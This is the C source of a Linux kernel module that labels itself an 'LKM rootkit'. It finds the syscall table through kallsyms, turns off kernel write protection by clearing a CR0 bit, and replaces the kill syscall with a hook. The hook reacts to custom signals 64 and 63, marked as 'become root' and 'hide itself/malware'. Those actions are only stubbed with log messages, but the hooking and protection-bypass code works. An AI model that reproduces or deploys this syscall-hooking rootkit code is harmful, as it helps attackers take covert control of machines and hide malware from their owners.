#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h> // this will give us access to kallsys_lookup_name function.
#include <linux/unistd.h> // contains syscall number
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("w3w3w3");
MODULE_DESCRIPTION("LKM rootkit");
MODULE_VERSION("0.0.1");

unsigned long * __sys_call_table;

#ifdef CONFIG_X86_64

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
#define PTREGS_SYSCALL_STUB 1
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
static ptregs_t orig_kill;
#else
typedef asmlinkage long (*orig_kill_t)(pid_t pid, int sig);
static orig_kill_t orig_kill;
#endif
#endif

enum signals {
    SIGSUPER = 64, // we just take this as an example.
    SIGINVIS = 63,
};

#if PTREGS_SYSCALL_STUB

static asmlinkage long hack_kill(const struct pt_regs *regs) {
    int sig = regs->si;

    if (sig == SIGSUPER) {
        printk(KERN_INFO "signal: %d == SIGSUPER: %d | become root\n", sig, SIGSUPER);
        return 0;
    } else if (sig == SIGINVIS) {
        printk(KERN_INFO "signal: %d == SIGINVIS: %d | hide itself/malware/etc\n", sig, SIGINVIS);
    }

    printk(KERN_INFO "======= hacked kill syscall =========");
    return orig_kill(regs);
}

#else

static asmlinkage long hack_kill(pid_t pid, int sig) {

    if (sig == SIGSUPER) {
        printk(KERN_INFO "signal: %d == SIGSUPER: %d | become root\n", sig, SIGSUPER);
        return 0;
    } else if (sig == SIGINVIS) {
        printk(KERN_INFO "signal: %d == SIGINVIS: %d | hide itself/malware/etc\n", sig, SIGINVIS);
    }
    printk(KERN_INFO "======= hacked kill syscall =========");
    return orig_kill(pid, sig);
}

#endif

static int cleanup(void) {
    /* kill */
    __sys_call_table[__NR_kill] = (unsigned long) orig_kill;

    return 0;
}

static int hook(void) {
    __sys_call_table[__NR_kill] = (unsigned long) &hack_kill;
    return 0;
}

static int store(void) {
    #if PTREGS_SYSCALL_STUB
        orig_kill = (ptregs_t)__sys_call_table[__NR_kill];
        printk(KERN_INFO "orig_kill table entry successfully stored\n");
    #else
        orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
        printk(KERN_INFO "orig_kill table entry successfully stored\n");
    #endif

    return 0;
}



static inline void write_cr0_forced(unsigned long val) {
    unsigned long __force_order;

    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
    // prevent read from being reordered with respect to writes, use a dummy operand.
}

// the 16th bit of cr0 should be flipped if we want to change the memory info. 
static void unprotect_memory(void) {
    write_cr0_forced(read_cr0() & (~ 0x10000));
    printk(KERN_INFO "protected memory\n");
}

static void protect_memory(void) {
    write_cr0_forced(read_cr0() | (0x10000));
    printk(KERN_INFO "protected memory\n");
}

static unsigned long *get_syscall_table(void) {
    unsigned long * syscall_table;
    #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
        syscall_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");
    #else
        syscall_table = NULL;
    #endif

    return syscall_table;
}

static int __init mode_init(void) {
    int err = 1;

    printk(KERN_INFO "rootkit:init\n");

    __sys_call_table = get_syscall_table();
    if (!__sys_call_table) {
        printk(KERN_INFO "error: __sys_call_table == null\n");
        return err;
    }

    if (store() == err) {
        printk(KERN_INFO "error: store error\n");
    }

    unprotect_memory();

    if (hook() == err) {
        printk(KERN_INFO "error: hook error\n");
    }

    protect_memory();

    return 0;
}

static void __exit mode_exit(void) {
    int err = 1;
    printk(KERN_INFO "rootkit:exit\n");

    unprotect_memory();

    if (cleanup() == err) {
        printk(KERN_INFO "eroor: cleanup error\n");
    }

    protect_memory();
}

module_init(mode_init);
module_exit(mode_exit);